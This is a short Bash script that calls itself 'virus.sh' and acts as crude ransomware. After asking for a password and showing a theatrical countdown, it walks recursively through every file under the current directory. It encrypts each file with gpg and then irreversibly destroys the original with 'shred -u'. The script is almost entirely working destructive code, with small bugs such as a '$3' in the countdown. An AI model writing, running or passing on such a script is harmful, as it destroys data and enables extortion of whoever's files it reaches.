function chk_dir
{
 #echo "$file"
 for i in $file
 do
	 if [ -d "$i" ]
	 then
		 #echo "if $i"
		 printf "$i is the directory\n"
		 sleep 0.5 
		 printf "entrying in $i\n"
		 file=$i$ext
		 chk_dir "$file"
	 else
		 #echo "else $i"
		 for i_1 in $i
		 do
			 echo "$i_1"
			if [ $i_1 == $path/$exp ]
			then
				printf "\nit is the exploit"
			else
			printf "encrypting $i_1 and deleteing original one\n" 
		        gpg -c --batch --passphrase $pass $i_1;shred -u $i_1
			#echo "test"
		 fi
		 done
	 fi
 done
 printf "\n\nCOMPLETED\n\n"
}
exp='virus.sh'
path=`pwd`
#ext1='/main/*'
ext='/*'
#next='.animesh'
file=$path$ext
printf "enter password you want for encrytion\n"
read pass
printf "$(tput setaf 1)uploading virus through $path\n$(tput setab 7)"
sleep 0.8
printf "$(tput setaf 1)exploit activating in\n$(tput setab 7)"
sleep 0.5
printf "$3\n"
sleep 0.3
printf "2\n"
sleep 0.3
printf "1\n"
sleep 0.3
printf "(tput setaf 2)DONE...\n"
printf "executing...\n"
chk_dir "$file" "$pass"
